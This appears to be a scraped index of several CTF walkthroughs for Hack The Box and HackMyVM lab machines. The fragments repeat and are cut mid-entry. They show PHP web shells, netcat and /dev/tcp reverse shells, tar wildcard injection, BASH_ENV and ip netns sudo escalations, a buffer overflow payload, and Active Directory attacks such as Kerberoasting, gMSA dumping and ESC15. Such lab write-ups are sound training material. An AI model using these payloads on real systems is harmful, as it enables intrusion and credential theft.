Since sudo preserves this variable, we can point it to our own script, and when we run sudo /usr/bin/systeminfo, Bash will execute our script with root privileges.\nWe create a Bash script in Hish’s home directory with the following content:\n#!/bin/bash\r/bin/bash Then we assign the BASH_ENV variable pointing to our script:\nexport BASH_ENV=/home/hish/root.sh When we execute sudo /usr/bin/systeminfo, Bash will automatically load our script, and we obtain a shell with root privileges.\nWe get the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/environment/","summary":"Difficulty: Medium 🟠","title":"Environment - Hack The Box"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/medium/family/","summary":"Difficulty: Medium 🟠","title":"Family - HackMyVM"},{"content":"\rMachine Link\nWe can see that when we open the machine it tells us its IP:\nSo knowing that the IP of the machine is 192.168.18.28, we are going to do a simple NMAP scan to see what ports it has open and what service they are running:\nNMAP simple scan\rWe can see that this machine hosts a web server on port 80 and that port 22 (ssh) is open.\nThis is what we see when we open the web server:\nIt tells us not to think too much.

Specifically, we will run the following commands to gain root access:\nsudo ip netns add foo sudo ip netns exec foo /bin/sh sudo ip netns delete foo We are finally the root user and can obtain the Root Flag.\n","permalink":"http://localhost:1313/writeups/easy/method/","summary":"Difficulty: Easy 🟢","title":"Method - HackMyVM"},{"content":"\rMachine Link\nTo begin, let\u0026rsquo;s find the IP of our target machine using arp-scan by executing the following command:\narp-scan -I eth0 --localnet 📝 NOTE: Normally, the MAC addresses of VirtualBox virtual machines start with 08:\nNow that we know its IP 192.168.18.169, let\u0026rsquo;s perform a port scan using NMAP to identify which ports are open, their services, and more information.\nNMAP scan\rSo now that we know it has ports 22 and 80 open, let\u0026rsquo;s access the web page hosted on this machine to see if we can find any useful information.\nIt tells us that the website is under maintenance, nothing more. So, I decide to use Gobuster to enumerate subdirectories, and I come across a text file named staff_statements.txt:\nGobuster enumeration\rstaff_statements.txt\rThe site is not yet repaired. Technicians are working on it by using old SSH connection files. Although the message doesn\u0026rsquo;t specify which files, I inferred it could involve older key files like id_rsa.bak rather than the current id_rsa. I searched for these old files, found them, and proceeded to download them.\nWe download id_rsa.bak\rNow that we have id_rsa.bak, we still need to know the username to log in. We already know the username since it is displayed when the machine starts:\nUser Jack\rBefore anything else, we need to grant permissions to the id_rsa.bak file with the following command:\nchmod 600 id_rsa.bak But when trying to access via SSH, it asks for a password, preventing us from entering.\nIt prevents us from accessing.\rSo, we can use John the Ripper to crack the password.\nssh2john id_rsa.bak \u0026gt; hash john --wordlist=/usr/share/wordlists/rockyou.txt hash John the Ripper result\rNow that we know the password, we can access.\nWe are the user Jack\rI decide, first of all, to check the users on this machine.\ngrep /bin/bash /etc/passwd Users on the machine\rAnd we find 3 users: jack, helder, root.\nNow it\u0026rsquo;s time for privilege escalation. In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

After a few minutes of searching, I didn’t find anything. The next step I have in mind is to use BloodHound to map the target’s Active Directory structure, identify relationships between users, groups, and permissions, and find potential privilege escalation paths within the domain.

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain.

In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;. This probably works because the upload filter only checks the final extension, and by adding the extra dot, the file passes validation, even though PHP interprets it normally. Now we can try executing commands on the server through the uploaded file’s URL.\nWe execute a Reverse Shell and access the machine.\nhttp://environment.htb/storage/files/cmd.php?cmd=nc -c /bin/bash 10.10.14.32 4444 Privilege escalation to Hish If we navigate to hish’s folder, we can read the User Flag. We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

Since sudo preserves this variable, we can point it to our own script, and when we run sudo /usr/bin/systeminfo, Bash will execute our script with root privileges.\nWe create a Bash script in Hish’s home directory with the following content:\n#!/bin/bash\r/bin/bash Then we assign the BASH_ENV variable pointing to our script:\nexport BASH_ENV=/home/hish/root.sh When we execute sudo /usr/bin/systeminfo, Bash will automatically load our script, and we obtain a shell with root privileges.\nWe get the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/environment/","summary":"Difficulty: Medium 🟠","title":"Environment - Hack The Box"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/medium/family/","summary":"Difficulty: Medium 🟠","title":"Family - HackMyVM"},{"content":"\rMachine Link\nWe can see that when we open the machine it tells us its IP:\nSo knowing that the IP of the machine is 192.168.18.28, we are going to do a simple NMAP scan to see what ports it has open and what service they are running:\nNMAP simple scan\rWe can see that this machine hosts a web server on port 80 and that port 22 (ssh) is open.\nThis is what we see when we open the web server:\nIt tells us not to think too much.

I am going to send myself a Reverse Shell and set up the TTY.\nNow that we are inside, let\u0026rsquo;s enumerate the existing users on the machine.\ngrep /bin/bash /etc/passwd Existing users\rWe find two users: prakasaka and root.\nPrivilege escalation to Prakasaka I decided to navigate to prakasaka’s home directory, and as the www-data user, we can read the User Flag.\nThe next step to escalate privileges is to read the file secret.php, where we find the password for the user prakasaka.\nWe are prakasaka\rPrivilege escalation to Root Next, we run the command sudo -l to list the commands that the user prakasaka is allowed to execute with elevated sudo privileges.\nPrivilege escalation with the ip binary\rWe have permission to execute /bin/ip with root privileges. To escalate to root, let’s consult GTFObins and use the recommended commands for /bin/ip. Specifically, we will run the following commands to gain root access:\nsudo ip netns add foo sudo ip netns exec foo /bin/sh sudo ip netns delete foo We are finally the root user and can obtain the Root Flag.\n","permalink":"http://localhost:1313/writeups/easy/method/","summary":"Difficulty: Easy 🟢","title":"Method - HackMyVM"},{"content":"\rMachine Link\nTo begin, let\u0026rsquo;s find the IP of our target machine using arp-scan by executing the following command:\narp-scan -I eth0 --localnet 📝 NOTE: Normally, the MAC addresses of VirtualBox virtual machines start with 08:\nNow that we know its IP 192.168.18.169, let\u0026rsquo;s perform a port scan using NMAP to identify which ports are open, their services, and more information.\nNMAP scan\rSo now that we know it has ports 22 and 80 open, let\u0026rsquo;s access the web page hosted on this machine to see if we can find any useful information.\nIt tells us that the website is under maintenance, nothing more. So, I decide to use Gobuster to enumerate subdirectories, and I come across a text file named staff_statements.txt:\nGobuster enumeration\rstaff_statements.txt\rThe site is not yet repaired. Technicians are working on it by using old SSH connection files. Although the message doesn\u0026rsquo;t specify which files, I inferred it could involve older key files like id_rsa.bak rather than the current id_rsa. I searched for these old files, found them, and proceeded to download them.\nWe download id_rsa.bak\rNow that we have id_rsa.bak, we still need to know the username to log in. We already know the username since it is displayed when the machine starts:\nUser Jack\rBefore anything else, we need to grant permissions to the id_rsa.bak file with the following command:\nchmod 600 id_rsa.bak But when trying to access via SSH, it asks for a password, preventing us from entering.\nIt prevents us from accessing.\rSo, we can use John the Ripper to crack the password.\nssh2john id_rsa.bak \u0026gt; hash john --wordlist=/usr/share/wordlists/rockyou.txt hash John the Ripper result\rNow that we know the password, we can access.\nWe are the user Jack\rI decide, first of all, to check the users on this machine.\ngrep /bin/bash /etc/passwd Users on the machine\rAnd we find 3 users: jack, helder, root.\nNow it\u0026rsquo;s time for privilege escalation. In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

The next step I have in mind is to use BloodHound to map the target’s Active Directory structure, identify relationships between users, groups, and permissions, and find potential privilege escalation paths within the domain.

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain.

In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

